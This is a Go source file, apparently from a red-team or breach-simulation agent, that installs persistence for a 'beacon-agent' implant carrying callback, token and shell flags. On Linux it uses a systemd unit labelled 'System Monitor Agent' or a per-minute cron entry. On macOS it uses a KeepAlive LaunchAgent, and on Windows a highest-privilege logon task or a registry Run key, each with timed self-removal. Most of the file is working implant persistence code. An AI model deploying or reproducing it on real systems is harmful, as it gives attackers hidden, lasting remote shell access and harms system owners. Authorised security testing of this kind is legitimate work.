package agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// PersistMethod describes a persistence mechanism.
type PersistMethod struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Platform    string `json:"platform"` // linux, darwin, windows, kubernetes
	Installed   bool   `json:"installed"`
	Path        string `json:"path,omitempty"` // where the persistence was written
	Error       string `json:"error,omitempty"`
}

// InstallPersistence installs the agent binary for automatic restart.
// The method is chosen based on the current platform and available privileges.
// All persistence is time-boxed: a removal command is scheduled after ttlMinutes.
func InstallPersistence(agentBinary string, callbackAddr string, token string, ttlMinutes int) PersistMethod {
	switch runtime.GOOS {
	case "linux":
		return installLinuxPersistence(agentBinary, callbackAddr, token, ttlMinutes)
	case "darwin":
		return installDarwinPersistence(agentBinary, callbackAddr, token, ttlMinutes)
	case "windows":
		return installWindowsPersistence(agentBinary, callbackAddr, token, ttlMinutes)
	default:
		return PersistMethod{
			Name:  "unsupported",
			Error: fmt.Sprintf("unsupported platform: %s", runtime.GOOS),
		}
	}
}

// RemovePersistence removes all known persistence mechanisms.
func RemovePersistence() []PersistMethod {
	var results []PersistMethod

	switch runtime.GOOS {
	case "linux":
		results = append(results, removeLinuxPersistence()...)
	case "darwin":
		results = append(results, removeDarwinPersistence()...)
	case "windows":
		results = append(results, removeWindowsPersistence()...)
	}

	return results
}

// --- Linux ---

func installLinuxPersistence(binary, callbackAddr, token string, ttlMinutes int) PersistMethod {
	// Try systemd first (requires root), fall back to cron.
	if os.Getuid() == 0 {
		if result := installSystemdService(binary, callbackAddr, token, ttlMinutes); result.Installed {
			return result
		}
	}
	return installCronPersistence(binary, callbackAddr, token, ttlMinutes)
}

const systemdServiceName = "beacon-agent"
const systemdServicePath = "/etc/systemd/system/beacon-agent.service"

func installSystemdService(binary, callbackAddr, token string, ttlMinutes int) PersistMethod {
	result := PersistMethod{
		Name:        "systemd",
		Description: "systemd service unit",
		Platform:    "linux",
		Path:        systemdServicePath,
	}

	unit := fmt.Sprintf(`[Unit]
Description=System Monitor Agent
After=network.target

[Service]
Type=simple
ExecStart=%s --callback %s --token %s --ttl %dm --evidence --shell --self-destruct
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
`, binary, callbackAddr, token, ttlMinutes)

	if err := os.WriteFile(systemdServicePath, []byte(unit), 0644); err != nil {
		result.Error = err.Error()
		return result
	}

	// Enable and start.
	exec.Command("systemctl", "daemon-reload").Run()          //nolint:errcheck
	exec.Command("systemctl", "enable", systemdServiceName).Run() //nolint:errcheck
	exec.Command("systemctl", "start", systemdServiceName).Run()  //nolint:errcheck

	// Schedule removal after TTL.
	if ttlMinutes > 0 {
		removeCmd := fmt.Sprintf(
			"sleep %d && systemctl stop %s && systemctl disable %s && rm -f %s %s && systemctl daemon-reload",
			ttlMinutes*60, systemdServiceName, systemdServiceName, systemdServicePath, binary,
		)
		exec.Command("bash", "-c", "nohup bash -c '"+removeCmd+"' &>/dev/null &").Run() //nolint:errcheck
	}

	result.Installed = true
	return result
}

func installCronPersistence(binary, callbackAddr, token string, ttlMinutes int) PersistMethod {
	result := PersistMethod{
		Name:        "cron",
		Description: "crontab entry (runs every minute)",
		Platform:    "linux",
	}

	cronLine := fmt.Sprintf("* * * * * %s --callback %s --token %s --ttl %dm --evidence --shell --self-destruct",
		binary, callbackAddr, token, ttlMinutes)

	// Read existing crontab.
	out, _ := exec.Command("crontab", "-l").Output()
	existing := string(out)

	// Don't duplicate.
	if strings.Contains(existing, "beacon-agent") || strings.Contains(existing, binary) {
		result.Installed = true
		result.Path = "crontab"
		return result
	}

	newCrontab := existing + "\n# beacon-agent\n" + cronLine + "\n"
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	if err := cmd.Run(); err != nil {
		result.Error = err.Error()
		return result
	}

	// Schedule removal after TTL.
	if ttlMinutes > 0 {
		removeCmd := fmt.Sprintf(
			"sleep %d && crontab -l | grep -v beacon-agent | crontab - && rm -f %s",
			ttlMinutes*60, binary,
		)
		exec.Command("bash", "-c", "nohup bash -c '"+removeCmd+"' &>/dev/null &").Run() //nolint:errcheck
	}

	result.Installed = true
	result.Path = "crontab"
	return result
}

func removeLinuxPersistence() []PersistMethod {
	var results []PersistMethod

	// Remove systemd service.
	if _, err := os.Stat(systemdServicePath); err == nil {
		exec.Command("systemctl", "stop", systemdServiceName).Run()    //nolint:errcheck
		exec.Command("systemctl", "disable", systemdServiceName).Run() //nolint:errcheck
		os.Remove(systemdServicePath)                                   //nolint:errcheck
		exec.Command("systemctl", "daemon-reload").Run()               //nolint:errcheck
		results = append(results, PersistMethod{
			Name: "systemd", Platform: "linux", Path: systemdServicePath,
			Description: "removed systemd service",
		})
	}

	// Remove cron entry.
	out, _ := exec.Command("crontab", "-l").Output()
	if strings.Contains(string(out), "beacon-agent") {
		cleaned := ""
		for _, line := range strings.Split(string(out), "\n") {
			if !strings.Contains(line, "beacon-agent") {
				cleaned += line + "\n"
			}
		}
		cmd := exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(cleaned)
		cmd.Run() //nolint:errcheck
		results = append(results, PersistMethod{
			Name: "cron", Platform: "linux", Path: "crontab",
			Description: "removed cron entry",
		})
	}

	return results
}

// --- macOS ---

const launchAgentName = "com.beacon.agent"

func launchAgentPath() string {
	home, _ := os.UserHomeDir()
	return filepath.Join(home, "Library", "LaunchAgents", launchAgentName+".plist")
}

func installDarwinPersistence(binary, callbackAddr, token string, ttlMinutes int) PersistMethod {
	result := PersistMethod{
		Name:        "launchagent",
		Description: "macOS LaunchAgent plist",
		Platform:    "darwin",
		Path:        launchAgentPath(),
	}

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        <string>--callback</string>
        <string>%s</string>
        <string>--token</string>
        <string>%s</string>
        <string>--ttl</string>
        <string>%dm</string>
        <string>--evidence</string>
        <string>--shell</string>
        <string>--self-destruct</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, launchAgentName, binary, callbackAddr, token, ttlMinutes)

	plistPath := launchAgentPath()
	dir := filepath.Dir(plistPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		result.Error = err.Error()
		return result
	}

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		result.Error = err.Error()
		return result
	}

	exec.Command("launchctl", "load", plistPath).Run() //nolint:errcheck

	// Schedule removal.
	if ttlMinutes > 0 {
		removeCmd := fmt.Sprintf(
			"sleep %d && launchctl unload %s && rm -f %s %s",
			ttlMinutes*60, plistPath, plistPath, binary,
		)
		exec.Command("bash", "-c", "nohup bash -c '"+removeCmd+"' &>/dev/null &").Run() //nolint:errcheck
	}

	result.Installed = true
	return result
}

func removeDarwinPersistence() []PersistMethod {
	var results []PersistMethod
	plistPath := launchAgentPath()
	if _, err := os.Stat(plistPath); err == nil {
		exec.Command("launchctl", "unload", plistPath).Run() //nolint:errcheck
		os.Remove(plistPath)                                  //nolint:errcheck
		results = append(results, PersistMethod{
			Name: "launchagent", Platform: "darwin", Path: plistPath,
			Description: "removed LaunchAgent plist",
		})
	}
	return results
}

// --- Windows ---

const registryKeyPath = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
const registryValueName = "BeaconAgent"
const scheduledTaskName = "BeaconAgent"

func installWindowsPersistence(binary, callbackAddr, token string, ttlMinutes int) PersistMethod {
	result := PersistMethod{
		Name:        "scheduled_task",
		Description: "Windows scheduled task",
		Platform:    "windows",
	}

	args := fmt.Sprintf("--callback %s --token %s --ttl %dm --evidence --shell --self-destruct",
		callbackAddr, token, ttlMinutes)

	// Create a scheduled task that runs at logon.
	cmd := exec.Command("schtasks", "/Create",
		"/TN", scheduledTaskName,
		"/TR", fmt.Sprintf(`"%s" %s`, binary, args),
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F",
	)
	if err := cmd.Run(); err != nil {
		// Fall back to registry run key.
		return installWindowsRegistryPersistence(binary, args, ttlMinutes)
	}

	// Schedule removal.
	if ttlMinutes > 0 {
		removeCmd := fmt.Sprintf(
			`timeout /t %d /nobreak >nul && schtasks /Delete /TN %s /F && del /f "%s"`,
			ttlMinutes*60, scheduledTaskName, binary,
		)
		exec.Command("cmd.exe", "/C", "start /b "+removeCmd).Run() //nolint:errcheck
	}

	result.Installed = true
	result.Path = `Task Scheduler\` + scheduledTaskName
	return result
}

func installWindowsRegistryPersistence(binary, args string, ttlMinutes int) PersistMethod {
	result := PersistMethod{
		Name:        "registry",
		Description: "Windows registry Run key",
		Platform:    "windows",
		Path:        registryKeyPath + `\` + registryValueName,
	}

	value := fmt.Sprintf(`"%s" %s`, binary, args)
	cmd := exec.Command("reg", "add", registryKeyPath, "/v", registryValueName, "/d", value, "/f")
	if err := cmd.Run(); err != nil {
		result.Error = err.Error()
		return result
	}

	// Schedule removal.
	if ttlMinutes > 0 {
		removeCmd := fmt.Sprintf(
			`timeout /t %d /nobreak >nul && reg delete %s /v %s /f && del /f "%s"`,
			ttlMinutes*60, registryKeyPath, registryValueName, binary,
		)
		exec.Command("cmd.exe", "/C", "start /b "+removeCmd).Run() //nolint:errcheck
	}

	result.Installed = true
	return result
}

func removeWindowsPersistence() []PersistMethod {
	var results []PersistMethod

	// Remove scheduled task.
	if err := exec.Command("schtasks", "/Delete", "/TN", scheduledTaskName, "/F").Run(); err == nil {
		results = append(results, PersistMethod{
			Name: "scheduled_task", Platform: "windows",
			Description: "removed scheduled task",
		})
	}

	// Remove registry key.
	if err := exec.Command("reg", "delete", registryKeyPath, "/v", registryValueName, "/f").Run(); err == nil {
		results = append(results, PersistMethod{
			Name: "registry", Platform: "windows", Path: registryKeyPath,
			Description: "removed registry run key",
		})
	}

	return results
}
